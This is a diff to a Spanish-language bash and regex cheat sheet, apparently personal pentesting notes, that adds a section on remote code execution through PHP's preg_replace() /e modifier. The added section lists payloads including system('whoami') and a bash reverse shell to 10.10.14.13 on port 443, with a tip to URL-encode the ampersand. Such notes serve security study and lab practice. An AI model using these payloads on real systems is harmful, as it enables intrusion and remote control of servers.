@@ -13,7 +13,21 @@ Tags: #Bashshell #Regex
 ❯ ./script.sh               # Ejecutar un script con permisos de ejecución 
 ```
 
-## REGEX
+## Regex Dangers 'preg_replace()' RCE
+
+* [Preg_replace()](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)
+
+```bash 
+❯ /addr*/      # Empieza por 'addr' y continua con lo que sea 
+❯ /i           # Case insensitive 
+
+❯ /e           # Agregar código PHP
+	❯ system("whoami")     # Mirar el nombre del usuario
+	❯ system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'") 
+		# Urlencodear el & = %26 
+```
+
+## Regex
 
 ```bash
 # Cuando recibimos un output, podemos mostrar solo el segundo argumento 
